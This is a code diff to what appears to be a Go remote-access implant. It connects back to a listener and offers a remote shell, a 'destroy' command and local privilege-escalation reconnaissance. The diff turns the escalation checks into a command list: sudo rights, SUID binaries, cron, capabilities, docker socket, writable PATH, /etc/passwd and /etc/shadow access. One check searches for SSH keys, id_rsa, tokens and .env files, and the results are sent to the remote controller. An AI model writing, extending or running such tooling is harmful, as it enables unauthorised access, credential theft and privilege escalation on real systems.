@@ -46,78 +46,36 @@ func getPublicIP(conn net.Conn) string {
 }
 
 type LPEResult struct {
-	OSInfo     string   `json:"os_info"`
-	Sudo       string   `json:"sudo"`
-	SUID       string   `json:"suid"`
-	Cron       string   `json:"cron"`
+	OSInfo       string `json:"os_info"`
+	Sudo         string `json:"sudo"`
+	SUID         string `json:"suid"`
+	Cron         string `json:"cron"`
 	Capabilities string `json:"capabilities"`
-	Docker     string   `json:"docker"`
-	PATH       string   `json:"path_writable"`
-	Passwd     string   `json:"passwd_writable"`
-	Shadow     string   `json:"shadow_readable"`
-	WorldWrite string   `json:"world_writable"`
-	Interesting string  `json:"interesting_files"`
+	Docker       string `json:"docker"`
+	PATH         string `json:"path_writable"`
+	Passwd       string `json:"passwd_writable"`
+	Shadow       string `json:"shadow_readable"`
+	WorldWrite   string `json:"world_writable"`
+	Interesting  string `json:"interesting_files"`
 }
 
-func runCmd(name string, args ...string) string {
-	cmd := exec.Command(name, args...)
-	var out bytes.Buffer
-	cmd.Stdout = &out
-	cmd.Stderr = &out
-	if err := cmd.Run(); err != nil {
-		return ""
-	}
-	return strings.TrimSpace(out.String())
+type LPECheck struct {
+	Name    string
+	Command string
 }
 
-func runShell(script string) string {
-	cmd := exec.Command("/bin/sh", "-c", script)
-	var out bytes.Buffer
-	cmd.Stdout = &out
-	cmd.Stderr = &out
-	if err := cmd.Run(); err != nil {
-		return ""
-	}
-	return strings.TrimSpace(out.String())
-}
-
-func runLPE() LPEResult {
-	r := LPEResult{}
-
-	// OS info
-	r.OSInfo = runShell("uname -a; cat /etc/os-release 2>/dev/null || cat /etc/issue 2>/dev/null")
-
-	// Sudo
-	r.Sudo = runShell("sudo -nl 2>/dev/null")
-
-	// SUID binaries
-	r.SUID = runShell("find / -perm -4000 -type f 2>/dev/null | head -30")
-
-	// Cron
-	r.Cron = runShell("ls -la /etc/cron* 2>/dev/null; cat /etc/crontab 2>/dev/null; crontab -l 2>/dev/null; find /etc/cron* -writable -type f 2>/dev/null")
-
-	// Capabilities
-	r.Capabilities = runShell("getcap -r / 2>/dev/null | head -20")
-
-	// Docker group
-	r.Docker = runShell("id | grep -i docker; ls -la /var/run/docker.sock 2>/dev/null")
-
-	// PATH writable dirs
-	r.PATH = runShell("echo $PATH | tr ':' '\\n' | while read d; do [ -w \"$d\" ] && echo \"WRITABLE: $d\"; done")
-
-	// /etc/passwd writable
-	r.Passwd = runShell("[ -w /etc/passwd ] && echo 'WRITABLE' || echo 'not writable'")
-
-	// /etc/shadow readable
-	r.Shadow = runShell("[ -r /etc/shadow ] && echo 'READABLE' || echo 'not readable'")
-
-	// World-writable in key dirs
-	r.WorldWrite = runShell("find /etc /usr/local /opt /var -writable -type f 2>/dev/null | head -20")
-
-	// Interesting files
-	r.Interesting = runShell("ls -la ~/.ssh/ 2>/dev/null; find / -name '*.key' -o -name 'id_rsa' -o -name 'token' -o -name '.env' 2>/dev/null | head -20; cat /etc/passwd | grep -v nologin | grep -v false | head -10")
-
-	return r
+var lpeChecks = []LPECheck{
+	{"os_info", "uname -a; cat /etc/os-release 2>/dev/null || cat /etc/issue 2>/dev/null"},
+	{"sudo", "sudo -nl 2>/dev/null"},
+	{"suid", "find / -perm -4000 -type f 2>/dev/null | head -30"},
+	{"cron", "ls -la /etc/cron* 2>/dev/null; cat /etc/crontab 2>/dev/null; crontab -l 2>/dev/null; find /etc/cron* -writable -type f 2>/dev/null"},
+	{"capabilities", "getcap -r / 2>/dev/null | head -20"},
+	{"docker", "id | grep -i docker; ls -la /var/run/docker.sock 2>/dev/null"},
+	{"path_writable", "echo $PATH | tr ':' '\\n' | while read d; do [ -w \"$d\" ] && echo \"WRITABLE: $d\"; done"},
+	{"passwd_writable", "[ -w /etc/passwd ] && echo 'WRITABLE' || echo 'not writable'"},
+	{"shadow_readable", "[ -r /etc/shadow ] && echo 'READABLE' || echo 'not readable'"},
+	{"world_writable", "find /etc /usr/local /opt /var -writable -type f 2>/dev/null | head -20"},
+	{"interesting_files", "ls -la ~/.ssh/ 2>/dev/null; find / -name '*.key' -o -name 'id_rsa' -o -name 'token' -o -name '.env' 2>/dev/null | head -20; cat /etc/passwd | grep -v nologin | grep -v false | head -10"},
 }
 
 func getLocalIP() string {
@@ -133,6 +91,17 @@ func getLocalIP() string {
 		}
 	}
 	return "unknown"
+}
+
+func runShell(script string) string {
+	cmd := exec.Command("/bin/sh", "-c", script)
+	var out bytes.Buffer
+	cmd.Stdout = &out
+	cmd.Stderr = &out
+	if err := cmd.Run(); err != nil {
+		return ""
+	}
+	return strings.TrimSpace(out.String())
 }
 
 func main() {
@@ -186,7 +155,8 @@ func main() {
 				fmt.Fprintf(os.Stderr, "shell exited: %v\n", err)
 			}
 
-			encoder.Encode(map[string]string{"status": "shell_done"})
+			// Raw marker — shell output is not JSON, so send raw
+			fmt.Fprintf(conn, "\n__ZHENG_SHELL_DONE__\n")
 
 		case "exit":
 			fmt.Fprintf(os.Stderr, "exiting...\n")
@@ -195,7 +165,42 @@ func main() {
 		case "lpe":
 			fmt.Fprintf(os.Stderr, "running LPE checks...\n")
 			encoder.Encode(map[string]string{"status": "lpe_running"})
-			results := runLPE()
+
+			// Send list of available checks
+			var checkNames []string
+			for _, ch := range lpeChecks {
+				checkNames = append(checkNames, ch.Name)
+			}
+			encoder.Encode(map[string]interface{}{"status": "lpe_checks", "checks": checkNames})
+
+			// Wait for skip list from listener
+			var skipMsg struct {
+				Cmd  string   `json:"cmd"`
+				Skip []string `json:"skip"`
+			}
+			if err := decoder.Decode(&skipMsg); err != nil {
+				fmt.Fprintf(os.Stderr, "failed to receive skip list: %v\n", err)
+				return
+			}
+
+			// Build skip set
+			skipSet := make(map[string]bool)
+			for _, s := range skipMsg.Skip {
+				skipSet[s] = true
+			}
+
+			// Run checks, send progress for each
+			results := make(map[string]string)
+			for _, ch := range lpeChecks {
+				if skipSet[ch.Name] {
+					encoder.Encode(map[string]string{"status": "lpe_skip", "name": ch.Name})
+					continue
+				}
+				encoder.Encode(map[string]string{"status": "lpe_check", "name": ch.Name, "cmd": ch.Command})
+				results[ch.Name] = runShell(ch.Command)
+			}
+
+			// Send final results
 			encoder.Encode(results)
 
 		case "destroy":
